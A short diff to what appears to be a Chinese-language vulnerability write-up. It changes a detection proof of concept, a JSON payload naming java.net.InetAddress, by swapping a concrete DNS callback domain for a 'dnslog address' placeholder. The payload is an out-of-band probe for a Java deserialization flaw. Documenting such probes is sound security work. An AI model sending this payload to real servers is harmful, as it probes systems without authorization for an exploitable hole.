@@ -21,5 +21,5 @@ Content-Length: 73
 
 探测poc:
 ```
-["java.net.InetAddress","wbbyrkxyiqthtcfm6va0l78syj4cs2gx6lw8mwb.b.huskpup.com"]
+["java.net.InetAddress","dnslog地址"]
 ```
